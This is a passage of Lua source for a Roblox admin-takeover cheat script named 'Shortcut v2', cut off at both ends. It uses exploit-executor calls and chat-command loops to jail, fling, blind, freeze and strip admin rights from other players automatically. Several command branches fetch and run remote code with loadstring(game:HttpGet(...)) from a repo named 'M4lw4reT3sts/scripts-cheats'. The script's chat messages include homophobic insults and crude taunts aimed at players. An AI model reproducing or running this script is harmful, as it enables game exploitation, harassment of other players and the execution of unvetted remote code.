		logn("antivoid is now set to " .. tostring(s))
	end;
	if string.sub(a6:lower(), 0, 12) == e .. "togglenames" then
		print("----- Anti's -----")
		print("anticrashvg (anticrashVG)" .. tostring(g))
		print("antijailgearban " .. tostring(h))
		print("antigrayscale " .. tostring(i))
		print("antikill " .. tostring(j))
		print("antijail " .. tostring(k))
		print("mymusiconly " .. tostring(l))
		print("mmoid (mymusiconly_ID) " .. tostring(m))
		print("antilogs " .. tostring(n))
		print("superlogs (Superlogs)" .. tostring(o))
		print("everyonecommands " .. tostring(p))
		print("padsenforcement (padsEnforcement)" .. tostring(q))
		print("antiattach" .. tostring(r))
		print("antivoid" .. tostring(s))
		print("")
	end
end)
function regen()
	fireclickdetector(game:GetService("Workspace").Terrain["_Game"].Admin.Regen.ClickDetector, 0)
end;
local aT = game:GetService("RunService")
aT.RenderStepped:Connect(function()
	if z == true then
		for ag, ae in pairs(game.Players.LocalPlayer.PlayerGui:GetDescendants()) do
			if ae.Name == "MessageGUI" or ae.Name == "Message" or ae.Name == "EFFECTGUIBLIND" or ae.Name == "HintGUI" then
				ae:Destroy()
			end
		end;
		for ag, ae in pairs(game.Workspace.Terrain["_Game"].Folder:GetDescendants()) do
			if ae.Name == "Message" then
				ae:Destroy()
			end
		end
	end
end)
function transformToColor3(aU)
	local aV = aU.r;
	local aW = aU.g;
	local aE = aU.b;
	return Color3.new(aV, aW, aE)
end;
task.spawn(function()
	while true do
		wait(0.05)
		if P == true then
			u("pm " .. Q .. " " .. L)
		end;
		if T == true then
			u(U)
		end;
		if R == true then
			u("gear " .. S .. " 000000000000000000253519495")
		end;
		if O == true then
			u("h " .. N)
		end;
		if g == true then
			if K == false then
				for ag, a7 in pairs(game:GetService("Players"):GetPlayers()) do
					if a7.Character then
						if a7.Character:FindFirstChild("VampireVanquisher") then
							local aX = a7.Name;
							u(prefix.."jail " .. aX)
							u("punish " .. aX)
							u("h \n\n\n\n\n\n\n\n\n\n\n\n\n\n Trapped a monkey in the monkey cage")
							wait(0.28)
						end;
						if a7.Character:FindFirstChild("HumanoidRootPart") then
							if a7.Character.HumanoidRootPart.Size.Y <= 0.3 then
								local aX = a7.Name;
								u(prefix.."jail " .. aX)
								u("punish " .. aX)
                                u("h \n\n\n\n\n\n\n\n\n\n\n\n\n\n Trapped a monkey in the monkey cage")
								wait(0.28)
							end
						end
					end
				end
			end
		end;
		if h == true then
			if game.Players.LocalPlayer.Character:FindFirstChild("Part") then
				game.Players.LocalPlayer.Character:FindFirstChild("Part"):Destroy()
				wait(0.25)
				u("speed me 16")
				u(e .. "set jp 50")
				if a == true then
					if d == true then
						u("h Cant remove my gears xd. (ShortCut)")
					else
						u("h Cant remove my gears xd.")
					end
				end
			end
		end
	end
end)
binarylist = {
	['0'] = '0000',
	['1'] = '0001',
	['2'] = '0010',
	['3'] = '0011',
	['4'] = '0100',
	['5'] = '0101',
	['6'] = '0110',
	['7'] = '0111',
	['8'] = '1000',
	['9'] = '1001',
	['10'] = '1010',
	['11'] = '1011',
	['12'] = '1100',
	['13'] = '1101',
	['14'] = '1110',
	['15'] = '1111'
}
function tobinary(aY)
	if aY > 15 then
		error([[-- Shortcut mods error --
Number "]] .. aY .. [[" is way to big to create a
4bit binary number from
(Not reportable)
ID #0011 (4-bit Binary Number)
-- Shortcut mods error --]])
	else
		return binarylist[tostring(aY)]
	end
end;
task.spawn(function()
	function Backup()
		data = ""
		if h == true then
			data = "1"
		else
			data = "0"
		end;
		if i == true then
			data = data .. "1"
		else
			data = data .. "0"
		end;
		if j == true then
			data = data .. "1"
		else
			data = data .. "0"
		end;
		if k == true then
			data = data .. "1"
		else
			data = data .. "0"
		end;
		if j == true then
			data = data .. "1"
		else
			data = data .. "0"
		end;
		if o == true then
			data = data .. "1"
		else
			data = data .. "0"
		end;
		if p == true then
			data = data .. "1"
		else
			data = data .. "0"
		end;
		if q == true then
			data = data .. "1"
		else
			data = data .. "0"
		end;
		if r == true then
			data = data .. "1"
		else
			data = data .. "0"
		end;
		if s == true then
			data = data .. "1"
		else
			data = data .. "0"
		end;
		return data
	end
end)
apis = {}
api_commands = {}
apis_cmdPref = {}
apis_Credits = {}
apis_Version = {}
apis_EncryptionKeys = {}
task.spawn(function()
	function hint(plr, a6)
		u([[h 




]] .. plr .. [[: ]] .. a6 .. [[





]])
	end;
	function wifiFix()
		wait(0.1)
	end;
	function CreateAPI(aZ, a_, b0, b1)
		local b2 = false;
		for ag, ae in pairs(apis) do
			if apis[ag] == aZ then
				b2 = true
			end
		end;
		if b2 == true then
			error([[-- Shortcut mods error --
found valid API "]] .. aZ .. [[" please check if it exists
else report this as an error
ID #0010 (4-bit Binary Number)
-- Shortcut mods error --]])
		elseif b2 == false then
			table.insert(apis, aZ)
			table.insert(apis_cmdPref, a_)
			table.insert(apis_Credits, b0)
			table.insert(apis_Version, b1)
			table.insert(apis_EncryptionKeys, [[0000 0000 0000 0000]])
		end
	end;
	function CreateCommand(aZ, a_, b3, b4)
		local b2 = false;
		local b5 = 0;
		for ag, ae in pairs(apis) do
			if apis[ag] == aZ then
				b2 = true;
				b5 = ag
			end
		end;
		if b2 == true then
			table.insert(api_commands, apis_cmdPref[b5] .. " " .. a_)
			game.Players.LocalPlayer.Chatted:Connect(function(a6)
				if b3 == true then
					if a6:lower() == e .. apis_cmdPref[b5] .. " " .. a_ then
						b4()
					end
				elseif b3 == false then
					if a6 == e .. apis_cmdPref[b5] .. " " .. a_ then
						b4()
					end
				end
			end)
		elseif b2 == false then
			error([[-- Shortcut mods error --
Cant find valid API "]] .. aZ .. [[" please check if it exists
else report this as an error
ID #0001 (4-bit Binary Number)
-- Shortcut mods error --]])
		end
	end;
	wait(0.1)
	local b6 = "Shortcut"
	local data = {
		tobinary(0),
		tobinary(1),
		tobinary(2),
		tobinary(3),
		tobinary(4),
		tobinary(5),
		tobinary(6),
		tobinary(7),
		tobinary(8),
		tobinary(9),
		tobinary(10),
		tobinary(11),
		tobinary(12),
		tobinary(13),
		tobinary(14),
		tobinary(15)
	}
	task.spawn(function()
		CreateAPI(b6, "sch", "SnowClan_8342, for Shortcut!", "v0.1")
		CreateCommand(b6, "modlist", true, function()
			print("----- API list (Info) -----")
			for ag, ae in pairs(apis) do
				print(apis[ag] .. " | " .. apis_Credits[ag] .. " | " .. apis_Version[ag] .. " | " .. apis_cmdPref[ag])
			end
		end)
		CreateCommand(b6, "reload", true, function()
			logn("Reloading API...")
			b6 = nil;
			data = nil;
			wifiFix()
			b6 = "Shortcut"
			data = {
				tobinary(0),
				tobinary(1),
				tobinary(2),
				tobinary(3),
				tobinary(4),
				tobinary(5),
				tobinary(6),
				tobinary(7),
				tobinary(8),
				tobinary(9),
				tobinary(10),
				tobinary(11),
				tobinary(12),
				tobinary(13),
				tobinary(14),
				tobinary(15)
			}
		end)
	end)
end)
task.spawn(function()
	while true do
		wait(5)
		for ag, a7 in pairs(game:GetService("Players"):GetPlayers()) do
			if a7.Character:FindFirstChild("VampireVanquisher") then
				if a7.Character.HumanoidRootPart.Size.Y <= 0.3 then
					gotoShortcutHub("Server crashed by vampiretool (Maybe?)", 15)
				end
			end
		end
	end
end)
task.spawn(function()
	while true do
		wait(0.05)
		if i == true then
			if game.Workspace.CurrentCamera:FindFirstChild("GrayScale") then
				game.Workspace.CurrentCamera:FindFirstChild("GrayScale"):Destroy()
				if a == true then
					if d == true then
						u("h Cant GrayScale me. (ShortCut)")
					else
						u("h Cant GrayScale me.")
					end
				end
			end
		end;
		if j == true then
			for b7, a7 in pairs(game.Players:GetChildren()) do
				for ag, ae in pairs(Ignore) do
					if a7.Name == Ignore[ag] then
						if a7.Character.Humanoid.Health == 0 then
							u("reset " .. Ignore[ag])
						end
					end
				end
			end;
			if game.Players.LocalPlayer.Character.Humanoid.Health == 0 then
				u("reset me")
			end
		end;
		if k == true then
			for ag, plr in pairs(Ignore) do
				if game:GetService("Workspace").Terrain["_Game"].Folder:FindFirstChild(plr .. "'s jail") then
					u("unjail " .. string.sub(plr, 0, 4):lower())
				end
			end;
			if game:GetService("Workspace").Terrain["_Game"].Folder:FindFirstChild(game.Players.LocalPlayer.Name .. "'s jail") then
				u("unjail me")
			end
		end;
		if l == true then
			if game:GetService("Workspace").Terrain["_Game"].Folder:FindFirstChild("Sound") then
				if game:GetService("Workspace").Terrain["_Game"].Folder.Sound.SoundId == "http://www.roblox.com/asset/?id=" .. m then
				else
					u("music " .. m)
					if a == true then
						if d == true then
							u("h \n\n\n Lemme listen to art xd\n\n\n Shortcut v2")
						else
							u("h \n\n\n Lemme listen to art xd\n\n\n")
						end
					end
				end
			end;
			if not game:GetService("Workspace").Terrain["_Game"].Folder:FindFirstChild("Sound") then
				u("music " .. m)
				if a == true then
					if d == true then
						u("h \n\n\n Lemme listen to art xd\n\n\n Shortcut v2")
					else
						u("h \n\n\n Lemme listen to art xd\n\n\n")
					end
				end
			end
		end
	end
end)

function start(plr) -- I made this entire bit when I had just 1 month of scripting experience
    task.spawn(function()
        for i,player in pairs(Admin) do
            if plr.Name == player then
                local command = string.gsub(msg:lower(), "me",  plr.Name)
                if string.sub(command, 1, 1) == "*" then
                    command = ""
                    game.Players:Chat("no workey")
                elseif string.sub(command, 1, 1) == prefix then
                    command = ""
                    game.Players:Chat("a "..plr.Name.." you suck")
                elseif string.sub(command, 1, 1) == "m" then
                    game.Players:Chat("h \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n "..plr.Name.." Commands that start with the letter M have been disabled \n \n If you wanna use M then type !msg and your message \n \n but if you wanna use Music then use say boombox me")
                elseif string.sub(command, 1, 2) == ":m" then
                elseif string.sub(command, 1, 12) == "gear me 947" then
                    game.Players:Chat("h \n \n \n Shortcut v2: Lol this trash named "..plr.Name.." wanted to crash the server LOOOL epic fail \n \n \n ")
                elseif string.sub(command, 1, 13) == ":gear me 947" then
                    game.Players:Chat("h \n \n \n Shortcut v2: Lol this trash named "..plr.Name.." wanted to crash the server LOOOL epic fail \n \n \n ")
                    game.Players:Chat("pm "..plr.Name.." You can't use Message' lol! type !msg instead")
                elseif string.sub(command, 1, 1) == "-" then
                    game.Players:Chat("h \n \n \n  "..plr.Name..": I can't ban people")
                elseif string.sub(command, 1, 2) == ":h" then
                    game.Players:Chat("h \n \n \n "..plr.Name..": \n \n \n ")
                    game.Players:Chat("pm "..plr.Name.."\n \n \n \n \n Type !hint in order to properly use :h")
                elseif string.sub(command, 1, 4) == ":nam" then
                    game.Players:Chat("h \n \n \n "..plr.Name..": name me \n \n \n ")
                elseif string.sub(command, 1, 7) == "message" then
                    game.Players:Chat("pm "..plr.Name.." You can t get a 'massage' lol!")
                elseif string.sub(command, 1, 8) == ":message" then
                    game.Players:Chat("pm "..plr.Name.." You can t get a 'massage' lol!")
                elseif string.sub(command, 1, 4) == "face" then
                    game.Players:Chat("h \n \n \n "..plr.Name..": facelist \n \n \n ")
                    game.Players:Chat("punish "..plr.Name.."")
                elseif string.sub(command, 1, 5) == ":face" then
                    game.Players:Chat("h \n \n \n "..plr.Name..": facelist \n \n \n ")
                    game.Players:Chat("punish "..plr.Name.."")
                elseif string.sub(command, 1, 2) == "pm" then
                    game.Players:Chat("h lol "..plr.Name.." This guy tried to plot behind my back lol!")
                elseif string.sub(command, 1, 3) == ":pm" then
                    game.Players:Chat("h lol "..plr.Name.." This guy tried to plot behind my back lol!")
                elseif string.sub(command, 1, 4) == "hint" then
                    game.Players:Chat("pm "..plr.Name.." You cant use 'hint' sorry!")
                elseif string.sub(command, 1, 1) == "h" then
                    game.Players:Chat("trip "..plr.Name.."")
                elseif string.sub(command, 1, 2) == "hi" then
                    game.Players:Chat("h \n \n \n "..plr.Name..": Hello guys \n \n \n ")
                elseif string.sub(command, 1, 4) == ":house" then
                    game.Players:Chat("h \n \n \n "..plr.Name..": I use admin joy trash \n \n \n ")
                    game.Players:Chat("punish "..plr.Name.."")
                elseif string.sub(command, 1, 4) == "logs" then
                    game.Players:Chat("freeze "..plr.Name.."!")
                elseif string.sub(command, 1, 5) == ":logs" then
                    game.Players:Chat("efirework "..plr.Name.."!")
                elseif string.sub(command, 1, 4) == "cmds" then
                    game.Players:Chat("time -")
                    loadstring(game:HttpGet(('https://raw.githubusercontent.com/M4lw4reT3sts/scripts-cheats/main/Cmds%20list%20for%20takeover%20v3'),true))()
                elseif string.sub(command, 1, 5) == ":cmds" then
                    game.Players:Chat("time -")
                    loadstring(game:HttpGet(('https://raw.githubusercontent.com/M4lw4reT3sts/scripts-cheats/main/Cmds%20list%20for%20takeover%20v3'),true))()
                elseif string.sub(command, 1, 8) == "commands" then
                    game.Players:Chat("time -")
                    loadstring(game:HttpGet(('https://raw.githubusercontent.com/M4lw4reT3sts/scripts-cheats/main/Cmds%20list%20for%20takeover%20v3'),true))()
                elseif string.sub(command, 1, 9) == ":commands" then
                    game.Players:Chat("a "..plr.Name.."")
                    loadstring(game:HttpGet(('https://raw.githubusercontent.com/M4lw4reT3sts/scripts-cheats/main/Cmds%20list%20for%20takeover%20v3'),true))()
                elseif string.sub(command, 1, 17) == "!specialcommands" then
                    game.Players:Chat("refresh all")
                    wait(.65)
                    loadstring(game:HttpGet(('https://raw.githubusercontent.com/M4lw4reT3sts/scripts-cheats/main/Special%20cmds%20list.txt'),true))()
                elseif string.sub(command, 1, 9) == "musiclist" then
                    game.Players:Chat("pm "..plr.Name.." You cant use 'musiclist' sorry!")
                elseif string.sub(command, 1, 11) == "packagelist" then
                    game.Players:Chat("pm "..plr.Name.." You cant use 'packagelist' sorry!")
                elseif string.sub(command, 1, 9) == "clone all" then
                    game.Players:Chat("h \n \n \n Shortcut v2 Anti Crash: Lol this trash named "..plr.Name.." failed to crash the server LOL laugh at this disgrace. \n \n \n ")
                    game.Players:Chat("fling "..plr.Name.."")
                    game.Players:Chat("-unadmin "..plr.Name.."")
                    game.Players:Chat("pm me Lol "..plr.Name.." lost their admin due to suspicious activity. Re-admin them if the result was false")
                    game.Players:Chat("pm "..plr.Name.." YOU CAN'T USE SIZE TO CRASH THE SERVER LOL")
                    game.Players:Chat("pm "..plr.Name.." YOU CAN'T USE SIZE TO CRASH THE SERVER LOL")
                    game.Players:Chat("pm "..plr.Name.." YOU CAN'T USE SIZE TO CRASH THE SERVER LOL")
                    game.Players:Chat("pm "..plr.Name.." YOU CAN'T USE SIZE TO CRASH THE SERVER LOL")
                    game.Players:Chat("pm "..plr.Name.." YOU CAN'T USE SIZE TO CRASH THE SERVER LOL")
                elseif string.sub(command, 1, 11) == "size all 0." then
                    game.Players:Chat("h \n \n \n Shortcut v2 Anti Crash: Lol this trash named "..plr.Name.." failed to crash the server LOL laugh at this disgrace. \n \n \n ")
                    game.Players:Chat("fling "..plr.Name.."")
                    game.Players:Chat("-unadmin "..plr.Name.."")
                    game.Players:Chat("pm me Lol "..plr.Name.." lost their admin due to suspicious activity. Re-admin them if the result was false")
                    game.Players:Chat("pm "..plr.Name.." YOU CAN'T USE SIZE TO CRASH THE SERVER LOL")
                    game.Players:Chat("pm "..plr.Name.." YOU CAN'T USE SIZE TO CRASH THE SERVER LOL")
                    game.Players:Chat("pm "..plr.Name.." YOU CAN'T USE SIZE TO CRASH THE SERVER LOL")
                    game.Players:Chat("pm "..plr.Name.." YOU CAN'T USE SIZE TO CRASH THE SERVER LOL")
                    game.Players:Chat("pm "..plr.Name.." YOU CAN'T USE SIZE TO CRASH THE SERVER LOL")
                elseif string.sub(command, 1, 12) == ":size all 0." then
                    game.Players:Chat("h \n \n \n Shortcut v2 Anti Crash: Lol this trash named "..plr.Name.." failed to crash the server LOL laugh at this disgrace. \n \n \n ")
                    game.Players:Chat("fling "..plr.Name.."")
                    game.Players:Chat("-unadmin "..plr.Name.."")
                    game.Players:Chat("pm me Lol "..plr.Name.." lost their admin due to suspicious activity. Re-admin them if the result was false")
                    game.Players:Chat("pm "..plr.Name.." YOU CAN'T USE SIZE TO CRASH THE SERVER LOL")
                    game.Players:Chat("pm "..plr.Name.." YOU CAN'T USE SIZE TO CRASH THE SERVER LOL")
                    game.Players:Chat("pm "..plr.Name.." YOU CAN'T USE SIZE TO CRASH THE SERVER LOL")
                    game.Players:Chat("pm "..plr.Name.." YOU CAN'T USE SIZE TO CRASH THE SERVER LOL")
                    game.Players:Chat("pm "..plr.Name.." YOU CAN'T USE SIZE TO CRASH THE SERVER LOL")
                elseif string.sub(command, 1, 10) == "size all ." then
                    game.Players:Chat("h \n \n \n Shortcut v2 Anti Crash: Lol this trash named "..plr.Name.." failed to crash the server LOL laugh at this disgrace. \n \n \n ")
                    game.Players:Chat("fling "..plr.Name.."")
                    game.Players:Chat("-unadmin "..plr.Name.."")
                    game.Players:Chat("pm me Lol "..plr.Name.." lost their admin due to suspicious activity. Re-admin them if the result was false")
                    game.Players:Chat("pm "..plr.Name.." YOU CAN'T USE SIZE TO CRASH THE SERVER LOL")
                    game.Players:Chat("pm "..plr.Name.." YOU CAN'T USE SIZE TO CRASH THE SERVER LOL")
                    game.Players:Chat("pm "..plr.Name.." YOU CAN'T USE SIZE TO CRASH THE SERVER LOL")
                    game.Players:Chat("pm "..plr.Name.." YOU CAN'T USE SIZE TO CRASH THE SERVER LOL")
                    game.Players:Chat("pm "..plr.Name.." YOU CAN'T USE SIZE TO CRASH THE SERVER LOL")
                elseif string.sub(command, 1, 11) == ":size all ." then
                    game.Players:Chat("h \n \n \n Shortcut v2 Anti Crash: Lol this trash named "..plr.Name.." failed to crash the server LOL laugh at this disgrace. \n \n \n ")
                    game.Players:Chat("fling "..plr.Name.."")
                    game.Players:Chat("-unadmin "..plr.Name.."")
                    game.Players:Chat("pm me Lol "..plr.Name.." lost their admin due to suspicious activity. Re-admin them if the result was false")
                    game.Players:Chat("pm "..plr.Name.." YOU CAN'T USE SIZE TO CRASH THE SERVER LOL")
                    game.Players:Chat("pm "..plr.Name.." YOU CAN'T USE SIZE TO CRASH THE SERVER LOL")
                    game.Players:Chat("pm "..plr.Name.." YOU CAN'T USE SIZE TO CRASH THE SERVER LOL")
                    game.Players:Chat("pm "..plr.Name.." YOU CAN'T USE SIZE TO CRASH THE SERVER LOL")
                    game.Players:Chat("pm "..plr.Name.." YOU CAN'T USE SIZE TO CRASH THE SERVER LOL")
                elseif string.sub(command, 1, 3) == "gay" then
                    game.Players:Chat("pm "..plr.Name.." We all know you're that")
                elseif string.sub(command, 2, 4) == "gay" then
                    game.Players:Chat("pm "..plr.Name.." We all know you're that")
                elseif string.sub(command, 3, 5) == "gay" then
                    game.Players:Chat("pm "..plr.Name.." We all know you're that")
                elseif string.sub(command, 4, 6) == "gay" then
                    game.Players:Chat("pm "..plr.Name.." We all know you're that")
                elseif string.sub(command, 5, 7) == "gay" then
                    game.Players:Chat("pm "..plr.Name.." We all know you're that")
                elseif string.sub(command, 6, 8) == "gay" then
                    game.Players:Chat("pm "..plr.Name.." We all know you're that")
                elseif string.sub(command, 7, 9) == "gay" then
                    game.Players:Chat("pm "..plr.Name.." We all know you're that")
                elseif string.sub(command, 8, 10) == "gay" then
                    game.Players:Chat("pm "..plr.Name.." We all know you're that")
                elseif string.sub(command, 9, 11) == "gay" then
                    game.Players:Chat("pm "..plr.Name.." We all know you're that")
                elseif string.sub(command, 10, 12) == "gay" then
                    game.Players:Chat("pm "..plr.Name.." We all know you're that")
                elseif string.sub(command, 11, 13) == "gay" then
                    game.Players:Chat("pm "..plr.Name.." We all know you're that")
                elseif string.sub(command, 1, 4) == ":gay" then
                    game.Players:Chat("h "..plr.Name.." We all know you're that lol")
                elseif string.sub(command, 1, 9) == ";shutdown" then
                    game.Players:Chat("h \n \n \n Shortcut v2 Anti Crash: Lol this trash named "..plr.Name.." failed to crash the server LOL laugh at this disgrace. \n \n \n ")
                    game.Players:Chat("fling "..plr.Name.."")
                    game.Players:Chat("-unadmin "..plr.Name.."")
                elseif string.sub(command, 1, 6) == ";crash" then
                    game.Players:Chat("h \n \n \n Shortcut v2 Anti Crash: Lol this trash named "..plr.Name.." failed to crash the server LOL laugh at this disgrace. \n \n \n ")
                    game.Players:Chat("punish "..plr.Name.."")
                    game.Players:Chat("-unadmin "..plr.Name.."")
                elseif string.sub(command, 1, 5) == ":size" then
                    game.Players:Chat("pm "..plr.Name.." Keep repeating the command to get bigger.")
                    game.Players:Chat("size "..plr.Name.." 1.5")
                elseif string.sub(command, 1, 6) == "uncmds" then
                    game.Players:Chat("refresh "..plr.Name.."")
                elseif string.sub(command, 1, 7) == ":uncmds" then
                    game.Players:Chat("refresh "..plr.Name.."")
                elseif string.sub(command, 1, 4) == "gear" then
                    game.Players:Chat("gear "..plr.Name.." 16726030")
                    game.Players:Chat("music rick")
                    game.Players:Chat("pm "..plr.Name.." Custom gears are disabled in this server. You can however get btools just type -btools lol")
                elseif string.sub(command, 1, 5) == ":gear" then
                    game.Players:Chat("gear "..plr.Name.." 16726030")
                    game.Players:Chat("music rick")
                elseif string.sub(command, 1, 3) == "sit" then
                    game.Players:Chat("freeze "..plr.Name.."")
                    wait(.75)
                    game.Players:Chat("fling "..plr.Name.."")
                    wait(.75)
                    game.Players:Chat("thaw "..plr.Name.."")
                elseif string.sub(command, 1, 4) == ":sit" then
                    game.Players:Chat("freeze "..plr.Name.."")
                    wait(.75)
                    game.Players:Chat("fling "..plr.Name.."")
                    wait(.75)
                    game.Players:Chat("thaw "..plr.Name.."")
                elseif string.sub(command, 1, 4) == "stun" then
                    game.Players:Chat("h \n \n \n "..plr.Name..": LOL I FAILED AT MOVING THE MAP.  \n \n And now I got dubstep rolled lol \n \n \n ")
                    game.Players:Chat("music rick")
                elseif string.sub(command, 1, 5) == ":stun" then
                    game.Players:Chat("speed "..plr.Name.." 0")
                elseif string.sub(command, 1, 3) == "dog" then
                    game.Players:Chat("char "..plr.Name.." 1943115524")
                elseif string.sub(command, 1, 4) == ":dog" then
                    game.Players:Chat("char "..plr.Name.." 1943115524")
                elseif string.sub(command, 1, 8) == "unpunish" then
                    game.Players:Chat("respawn "..plr.Name.."")
                elseif string.sub(command, 1, 9) == ":unpunish" then
                    game.Players:Chat("reset "..plr.Name.."")
                    game.Players:Chat("refresh "..plr.Name.."")
                    game.Players:Chat("reload "..plr.Name.." gun")
                elseif string.sub(command, 1, 6) == "freeze" then
                    game.Players:Chat("blind "..plr.Name.."")
                    game.Players:Chat("speed "..plr.Name.." 0")
                    game.Players:Chat("stun "..plr.Name.."")
                elseif string.sub(command, 1, 5) == ".loop" then
                    game.Players:Chat("pm "..plr.Name.." Stop using Noobsploit, hop over and join Sc v2 we got better commands and more options to choose from. And with Premium you can do things like this.")
                    game.Players:Chat("-unadmin "..plr.Name.." 0")
                    game.Players:Chat("punish "..plr.Name.."")
                    game.Players:Chat("blind "..plr.Name.."")
                elseif string.sub(command, 1, 5) == ".perm" then
                    game.Players:Chat("pm "..plr.Name.." Stop using Noobsploit, hop over and join Sc v2 we got better commands and more options to choose from. And with Premium you can do things like this.")
                    game.Players:Chat("-unadmin "..plr.Name.." 0")
                    game.Players:Chat("punish "..plr.Name.."")
                    game.Players:Chat("blind "..plr.Name.."")
                elseif string.sub(command, 1, 5) == ".hous" then
                    game.Players:Chat("pm "..plr.Name.." Stop using Noobsploit, hop over and join Sc v2 we got better commands and more options to choose from. And with Premium you can do things like this.")
                    game.Players:Chat("-unadmin "..plr.Name.." 0")
                    game.Players:Chat("punish "..plr.Name.."")
                    game.Players:Chat("blind "..plr.Name.."")
                elseif string.sub(command, 1, 5) == ".togg" then
                    game.Players:Chat("pm "..plr.Name.." Stop using Noobsploit, hop over and join Sc v2 we got better commands and more options to choose from. And with Premium you can do things like this.")
                    game.Players:Chat("-unadmin "..plr.Name.." 0")
                    game.Players:Chat("punish "..plr.Name.."")
                    game.Players:Chat("blind "..plr.Name.."")
                elseif string.sub(command, 1, 3) == ".bo" then
                    game.Players:Chat("pm "..plr.Name.." Stop using Noobsploit, hop over and join Sc v2 we got better commands and more options to choose from. And with Premium you can do things like this.")
                    game.Players:Chat("-unadmin "..plr.Name.." 0")
                    game.Players:Chat("punish "..plr.Name.."")
                    game.Players:Chat("blind "..plr.Name.."")
                elseif string.sub(command, 1, 5) == ".pads" then
                    game.Players:Chat("pm "..plr.Name.." Stop using Noobsploit, hop over and join Sc v2 we got better commands and more options to choose from. And with Premium you can do things like this.")
                    game.Players:Chat("-unadmin "..plr.Name.." 0")
                    game.Players:Chat("punish "..plr.Name.."")
                    game.Players:Chat("blind "..plr.Name.."")
                elseif string.sub(command, 1, 7) == ":freeze" then
                    game.Players:Chat("blind "..plr.Name.."")
                    game.Players:Chat("speed "..plr.Name.." 0")
                    game.Players:Chat("stun "..plr.Name.."")
                elseif string.sub(command, 1, 3) == "car" then
                    game.Players:Chat("gear "..plr.Name.." 164207580")
                    game.Players:Chat("//play 33")
                    game.Players:Chat("h \n \n \n "..plr.Name..": Me vibing in my car belike \n \n \n")
                elseif string.sub(command, 1, 3) == "old" then
                    game.Players:Chat("music 00000000000000000002093728519")
                    game.Players:Chat("h \n \n \n "..plr.Name..": I love old Roblox \n \n \n")
                elseif string.sub(command, 1, 4) == ":car" then
                    game.Players:Chat("gear "..plr.Name.." 164207580")
                    game.Players:Chat("//play 33")
                    game.Players:Chat("h \n \n \n "..plr.Name..": Me vibing in my car belike \n \n \n")
                elseif string.sub(command, 1, 4) == "thaw" then
                    game.Players:Chat("reset "..plr.Name.."")
                elseif string.sub(command, 1, 5) == "undog" then
                    game.Players:Chat("unchar "..plr.Name.."")
                    game.Players:Chat("h \n \n \n  l "..plr.Name.." l Has chosen the easy way out \n \n \n ")
                elseif string.sub(command, 1, 6) == ":undog" then
                    game.Players:Chat("unchar "..plr.Name.."")
                    game.Players:Chat("h \n \n \n  l "..plr.Name.." l Has chosen the easy way out \n \n \n ")
                elseif string.sub(command, 1, 5) == "unsit" then
                    game.Players:Chat("reset "..plr.Name.."")
                    game.Players:Chat(",msg l "..plr.Name.." l Has chosen the easy way out")
                elseif string.sub(command, 1, 4) == ":fly" then
                    game.Players:Chat("fly "..plr.Name.."")
                    game.Players:Chat("pm "..plr.Name.." Type :ffly to be able to fly on mobile")
                elseif string.sub(command, 1, 4) == "####" then
                    game.Players:Chat("damage "..plr.Name.." 95")
                    game.Players:Chat("pm "..plr.Name.." Lol it turns out your command was tagged meaning it won't work")
                    game.Players:Chat("h \n \n \n \n \n \n Lol "..plr.Name.." s command is tagged. Laugh at this user \n \n \n")
                elseif string.sub(command, 1, 3) == "fly" then
                    game.Players:Chat("fly "..plr.Name.."")
                    game.Players:Chat("pm "..plr.Name.." Type :ffly to be able to fly on mobile")
                elseif string.sub(command, 1, 5) == "flash" then
                    game.Players:Chat("char "..plr.Name.." 111173455")
                    game.Players:Chat("time 13")
                elseif string.sub(command, 1, 6) == ":flash" then
                    game.Players:Chat("char "..plr.Name.." 111173455")
                    game.Players:Chat("time 13")
                elseif string.sub(command, 1, 2) == "/e" then
                    game.Players:Chat("pm "..plr.Name.." Type /e free for free sperm")
                elseif string.sub(command, 1, 6) == ".admin" then
                    game.Players:Chat("-unadmin "..plr.Name.."")
                elseif string.sub(command, 1, 4) == "swag" then
                    game.Players:Chat("char "..plr.Name.." 2969437692")
                elseif string.sub(command, 1, 5) == ":swag" then
                    game.Players:Chat("char "..plr.Name.." 2969437692")
                elseif string.sub(command, 1, 1) == "," then
                    game.Players:Chat("seizure "..plr.Name.."")
                elseif string.sub(command, 1, 4) == "-aut" then
                    game.Players:Chat("h "..plr.Name.." you can't turn on auto admin all lol")
                elseif string.sub(command, 1, 4) == "-rat" then
                    game.Players:Chat("efirework "..plr.Name.."")
                elseif string.sub(command, 1, 4) == "brin" then
                    game.Players:Chat(".sm lol "..plr.Name.." is a l0ser who needs to go back to HD admin trash")
                    game.Players:Chat("efirework "..plr.Name.."")
                    game.Players:Chat("music 6745990615")
                elseif string.sub(command, 1, 5) == ":brin" then
                    game.Players:Chat("h \n \n \n Server Message: lol "..plr.Name.." is a l0ser who needs to go back to HD admin trash \n \n \n ")
                    game.Players:Chat("efirework "..plr.Name.."")
                    game.Players:Chat("music 6745990615")
                elseif string.sub(command, 1, 3) == ":to" then
                    game.Players:Chat("-smd lol "..plr.Name.." is a l0ser who needs to go back to HD admin trash")
                    game.Players:Chat("efirework "..plr.Name.."")
                    game.Players:Chat("music 6745990615")
                elseif string.sub(command, 1, 5) == ":goto" then
                    game.Players:Chat("h \n \n \n "..plr.Name..": I am buying a J BL  GO 2 today lol \n \n \n ")
                elseif string.sub(command, 1, 4) == "goto" then
                    game.Players:Chat("h \n \n \n "..plr.Name..": I am buying a J BL  GO 2 today lol \n \n \n ")
                elseif string.sub(command, 1, 3) == "idc" then
                    game.Players:Chat("-smd gg "..plr.Name.." is mad LOL")
                    game.Players:Chat("music 8974629576")
                elseif string.sub(command, 1, 4) == "cope" then
                    game.Players:Chat("h \n \n \n No cope or I will crash the server \n \n \n ")
                elseif string.sub(command, 1, 9) == ":shutdown" then
                    game.Players:Chat("-smd LOL "..plr.Name.." TRIED TO CRASH")
                elseif string.sub(command, 1, 6) == ":crash" then
                    game.Players:Chat("-smd LOL "..plr.Name.." TRIED TO CRASH")
                elseif string.sub(command, 1, 5) == "ratio" then
                    game.Players:Chat("-smd Lol "..plr.Name.." is talking about a radio.")
                elseif string.sub(command, 1, 4) == "your" then
                    game.Players:Chat("h \n \n \n "..plr.Name..": your mom \n \n \n ")
                elseif string.sub(command, 1, 5) == "smoke" then
                    game.Players:Chat("h \n \n \n "..plr.Name..": I smoke w  every day \n \n \n ")
                    game.Players:Chat("music 8703175543")
                    game.Players:Chat("blind "..plr.Name.."")
                    game.Players:Chat("/trap "..plr.Name.."")
                elseif string.sub(command, 1, 6) == ":smoke" then
